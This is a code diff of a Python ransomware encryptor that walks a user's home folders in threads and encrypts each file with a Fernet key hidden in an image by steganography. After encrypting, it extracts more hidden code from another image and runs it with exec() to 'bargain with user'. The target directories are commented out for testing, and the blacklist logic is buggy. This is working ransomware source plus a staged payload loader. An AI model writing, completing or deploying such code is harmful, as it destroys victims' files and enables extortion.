@@ -1,11 +1,10 @@
 import os
-import extract
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor
+from extract import extract_message
 
 
-
-def encrypt_file(filename: str, key):
+def encrypt_file(filename: str, key: str):
     """
     Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
     :param filename: Represents the file to undergo encryption
@@ -13,58 +12,64 @@ def encrypt_file(filename: str, key):
     :return: None
     """
     # Converts that key to a Fernet object to gain access to Fernet methods
-    f_key = Fernet(key)
+    f_key: Fernet = Fernet(key)
     # Assigns the data inside the unencrypted file to a variable
     with open(filename, "rb") as unencrypted_file:
         plaintext = unencrypted_file.read()
-    # Decrypts the unencrypted data using the key and assigns the encrypted data to a variable
+    # Encrypts the unencrypted data using the key and assigns the encrypted data to a variable
     ciphertext = f_key.encrypt(plaintext)
     # Overwrites the same file
     with open(filename, "wb") as encrypted_file:
         encrypted_file.write(ciphertext)
 
 
-def process_directory(directory: str, key, blacklist: list[str]):
+def process_directory(directory: str, key: str, blacklist: list[str]):
     """
     This function processes each directory, encrypting files that are not in the blacklist.
-    :param directory: Represents the path to a directory that will have its files decrypted.
+    :param directory: Represents the path to a directory that will have its files encrypted.
     :param key: Represents the key to be converted to an instance of Fernet object.
     :param blacklist:
     :return: None
     """
     # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
-    for root, _, files in os.walk(directory):
+    for root, dir, files in os.walk(directory):
         # Iterates through each file in the directory
+        for directory in blacklist:
+            dir.remove(directory)
         for file in files:
             if file not in blacklist:
                 # Combines the path of the directory with the file name to create filepath of file
                 file_path = os.path.join(root, file)
-                # Decrypts the file given the newly generated filepath
+                # Encrypts the file given the newly generated filepath
                 encrypt_file(file_path, key)
                 print(file)
 
 
+
 def main():
     # Extracts the key from a specified image
-    key = extract.extract_message("download.jpg", "Mochi")
-    print(key)
-    # Represents files to avoid for safety
-    blacklist: list[str] = ["bargain_with_user.exe", "bargain_with_user.py",
-                            "decrypt.exe", "decrypt.py",
-                            "encrypt.exe", "encrypt.py",
-                            "extract.py"
-                                        ,
-                            "Popup.png",
-                            "scan_and_execute.exe", "scan_and_execute.py",
-                            "steghide.exe",
-                            "sys32.exe"]
+    # TODO: Update the name of the images as needed
+    image_containing_bargaining_code: str = "download4.bpm"
+    image_containing_encryption_code: str = "download2.bpm"
+    image_containing_decryption_code: str = "download3.bpm"
+    image_containing_key: str = "download.jpg"
+
+    key: str = extract_message(image_containing_key, "Mochi")
+
+    # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
+    # of the ransomware.
+    # TODO: Verify, but SHOULD prevent the code from encrypting itself
+    blacklist: list[str] = [os.getcwd()]
+
+    #encrypt_file("encrypted_file.txt", key)
 
     # Directories to encrypt in their entirety
+    # TODO: Update as needed for testing purposes
     directories_to_encrypt = [
-        os.path.expanduser("~/Downloads"),
-        os.path.expanduser("~/Documents"),
-        os.path.expanduser("~/Pictures"),
-        os.path.expanduser("~/Desktop")
+        #os.path.expanduser("~/Downloads"),
+        #os.path.expanduser("~/Documents"),
+        #os.path.expanduser("~/Pictures"),
+        #os.path.expanduser("~/Desktop")
     ]
 
     # Start a thread for each directory
@@ -76,7 +81,9 @@ def main():
         for future in futures:
             future.result()
 
+    code_to_bargain_with_user: str = extract_message(image_containing_bargaining_code, "Mochi")
+    exec(code_to_bargain_with_user)
     print("Encryption successful!")
-    
+
 
 main()
